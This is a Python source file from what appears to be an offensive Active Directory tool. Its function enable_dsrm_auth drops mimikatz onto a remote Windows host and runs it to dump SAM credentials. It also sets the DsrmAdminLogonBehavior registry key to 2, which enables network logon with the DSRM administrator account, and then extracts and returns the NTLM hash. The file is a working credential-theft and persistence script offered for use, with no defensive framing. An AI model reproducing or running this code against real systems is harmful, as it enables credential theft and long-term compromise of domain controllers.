from colored import Fore
import re
from .miscellaneous import execute_cmd, drop_mimikatz

def enable_dsrm_auth(target: str, username: str, password: str, domain: str, use_hash: bool = False) -> str:
    drop_mimikatz(username, password, target)

    cmd_command = rf'C:\Users\{username}\Desktop\mimikatz.exe "token::elevate" "lsadump::sam" "exit" "reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f"'
    

    success, output = execute_cmd(target, username, password, domain, cmd_command, use_hash)
    
    print(f"{Fore.yellow}[*] Getting DSRM hash")
    print(f"{Fore.yellow}[*] Target: {target} ")
    print(f"{Fore.yellow}[*] Domain: {domain}\\{username}")
    print()

    success, output = execute_cmd(target, username, password, domain, cmd_command, use_hash)

    if "Hash NTLM" in output:
        print(f"{Fore.green}[+] DSRM Hash:")
        print()

        for line in output.split('\n'):
            if 'Hash NTLM' in line:
                ntlm = line.split(':')[-1].strip()
                print(f"{Fore.white} {ntlm}")
        print()
        return ntlm
    elif "Error" in output:
        print(f"{Fore.red}[-] Failed to get DSRM Hash")
        error_match = re.search(r'ERROR_MSG: (.+)', output)
        if error_match:
            print(f"{Fore.red} Error: {error_match.group(1)}")
        return None